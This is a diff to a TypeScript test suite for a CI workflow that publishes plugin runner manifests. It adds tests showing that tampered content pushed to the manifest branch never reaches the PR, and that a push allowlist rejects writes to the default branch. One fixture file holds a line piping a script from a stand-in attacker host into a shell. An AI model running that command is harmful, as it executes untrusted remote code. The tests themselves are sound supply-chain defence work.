@@ -268,6 +268,7 @@ type FixtureOptions = {
   releaseAssets?: Record<string, string>;
   prs?: GhPullRequest[];
   supersededBranches?: string[];
+  manifestBranchFiles?: Record<string, string>;
 };
 
 function createFixture(options: FixtureOptions = {}): Fixture {
@@ -303,6 +304,17 @@ function createFixture(options: FixtureOptions = {}): Fixture {
   git(seed, 'push', '--quiet', 'origin', 'main');
   for (const branch of options.supersededBranches ?? []) {
     git(seed, 'push', '--quiet', 'origin', `main:refs/heads/${branch}`);
+  }
+  if (options.manifestBranchFiles) {
+    // Someone with write access pushes onto the workflow-owned manifest branch.
+    git(seed, 'checkout', '--quiet', '-b', BRANCH);
+    for (const [path, content] of Object.entries(options.manifestBranchFiles)) {
+      write(seed, path, content);
+    }
+    git(seed, 'add', '-A');
+    git(seed, 'commit', '--quiet', '-m', 'unrelated work pushed onto the manifest branch');
+    git(seed, 'push', '--quiet', 'origin', BRANCH);
+    git(seed, 'checkout', '--quiet', 'main');
   }
 
   const gh = installGhStub(root, {
@@ -570,6 +582,68 @@ test('rerunning the publish job converges: no second commit, no second PR', () =
   }
 });
 
+test('content pushed onto the manifest branch by anyone else never reaches the PR', () => {
+  // The branch is workflow-owned and unprotected: the delivery path must rebuild
+  // its content from main rather than carry whatever the branch happens to hold
+  // into a PR a maintainer approves as a routine bot manifest update.
+  const fixture = createFixture({
+    releaseAssets: completeRelease(),
+    manifestBranchFiles: {
+      'evil.sh': 'curl https://attacker.example/x | sh\n',
+      'README.md': 'tampered repository content\n',
+    },
+  });
+  try {
+    const tampered = originRef(fixture, BRANCH);
+    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
+    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
+    assert.equal(run.outputs.branch.existed, 'true', 'the branch has to be the reuse path');
+
+    const head = originRef(fixture, BRANCH);
+    const main = originRef(fixture, 'main');
+    const show = (ref: string, path: string) =>
+      git(fixture.root, '--git-dir', fixture.origin, 'show', `${ref}:${path}`);
+
+    assert.deepEqual(
+      git(
+        fixture.root,
+        '--git-dir',
+        fixture.origin,
+        'diff',
+        '--name-only',
+        String(main),
+        String(head),
+      )
+        .trim()
+        .split('\n')
+        .sort(),
+      [
+        'packages/claude-plugin/runner-manifest.json',
+        'packages/codex-plugin/runner-manifest.json',
+        'runner-manifest.json',
+      ],
+      'the PR may differ from main in the trust root and nothing else',
+    );
+    assert.equal(show(String(head), 'README.md'), show(String(main), 'README.md'));
+    assert.throws(() => show(String(head), 'evil.sh'), 'the smuggled file must be gone');
+    assert.doesNotThrow(
+      () =>
+        git(
+          fixture.root,
+          '--git-dir',
+          fixture.origin,
+          'merge-base',
+          '--is-ancestor',
+          String(tampered),
+          String(head),
+        ),
+      'the branch must be updated by fast-forward — this workflow never force-pushes',
+    );
+  } finally {
+    fixture.cleanup();
+  }
+});
+
 test('a rerun after the release manifest drifts re-commits onto the same branch', () => {
   const fixture = createFixture({ releaseAssets: completeRelease() });
   try {
@@ -716,7 +790,7 @@ test('a failed remote query fails the job instead of reading as "nothing to deli
     const run = runPublish(fixture, { workdir });
 
     assert.equal(run.ok, false, 'a green run here leaves the trust root undelivered');
-    assert.equal(run.failed?.name, 'Check out the version-keyed manifest branch');
+    assert.equal(run.failed?.name, 'Rebuild the version-keyed manifest branch from main');
     assert.match(run.failed?.stderr ?? '', /::error::could not ask origin whether/);
     assert.equal(
       ghCalls(fixture).some((c) => c.startsWith('pr ')),
@@ -873,6 +947,24 @@ for (const [jobId, asset, bytes] of [
 
 // --- structural contract (assertions the simulation cannot make) ---
 
+// Allowlist, not blacklist: `git push origin HEAD` while checked out on main
+// writes to the default branch just as surely as naming it, and a global option
+// before the subcommand (`git -C . push ...`) must be rejected rather than
+// silently skipped. Only two shapes are permitted — writing the manifest branch,
+// and deleting a superseded one.
+const PERMITTED_PUSHES = [
+  ['git', 'push', 'origin', '$BRANCH'],
+  ['git', 'push', 'origin', '--delete', '$ref'],
+];
+
+function isGitPush(tokens: string[]): boolean {
+  return tokens[0] === 'git' && tokens.includes('push');
+}
+
+function isPermittedPush(tokens: string[]): boolean {
+  return PERMITTED_PUSHES.some((allowed) => JSON.stringify(tokens) === JSON.stringify(allowed));
+}
+
 test('every push targets the version-derived manifest branch, never a default-branch ref', () => {
   // The simulation proves what the delivery path DOES; this proves what no path
   // anywhere in the workflow may do — reach the default branch — including jobs
@@ -880,25 +972,40 @@ test('every push targets the version-derived manifest branch, never a default-br
   // normalised token arrays, so quoting or ${BRANCH} spelling does not matter.
   const pushes = everyStep().flatMap(({ jobId, step }) =>
     shellCommands(step.run ?? '')
-      .filter((tokens) => tokens[0] === 'git' && tokens[1] === 'push')
+      .filter(isGitPush)
       .map((tokens) => ({ jobId, tokens })),
   );
   assert.ok(pushes.length > 0, 'the manifest has to be pushed somewhere');
-  // Allowlist, not blacklist: `git push origin HEAD` while checked out on main
-  // writes to the default branch just as surely as naming it. Only two shapes are
-  // permitted — writing the manifest branch, and deleting a superseded one.
-  const write = ['git', 'push', 'origin', '$BRANCH'];
-  const del = ['git', 'push', 'origin', '--delete', '$ref'];
   for (const { jobId, tokens } of pushes) {
-    const permitted =
-      JSON.stringify(tokens) === JSON.stringify(write) ||
-      JSON.stringify(tokens) === JSON.stringify(del);
-    assert.ok(permitted, `${jobId} pushes somewhere unexpected: ${tokens.join(' ')}`);
+    assert.ok(isPermittedPush(tokens), `${jobId} pushes somewhere unexpected: ${tokens.join(' ')}`);
   }
   assert.ok(
-    pushes.some(({ tokens }) => JSON.stringify(tokens) === JSON.stringify(write)),
+    pushes.some(({ tokens }) => isPermittedPush(tokens)),
     'the manifest branch must be pushed',
   );
+});
+
+test('the push allowlist rejects default-branch writes however they are spelled', () => {
+  // A guard that silently skips what it cannot parse is not a guard: each of
+  // these must be SEEN as a push and REFUSED, not filtered out of the check.
+  const forbidden = [
+    'git push origin HEAD:main',
+    'git push origin HEAD',
+    'git push origin main',
+    'git -C . push origin HEAD:main',
+    'git --git-dir=.git push origin main',
+    'git push --force origin "$BRANCH"',
+    'git push origin "${BRANCH}:main"',
+  ];
+  for (const line of forbidden) {
+    const [tokens] = shellCommands(line);
+    assert.ok(isGitPush(tokens), `not recognised as a push, so never checked: ${line}`);
+    assert.equal(isPermittedPush(tokens), false, `allowlist accepted: ${line}`);
+  }
+  for (const line of ['git push origin "$BRANCH"', 'git push origin --delete "$ref"']) {
+    const [tokens] = shellCommands(line);
+    assert.ok(isPermittedPush(tokens), `allowlist rejected a required push: ${line}`);
+  }
 });
 
 test('the publish job is permitted to open a pull request', () => {
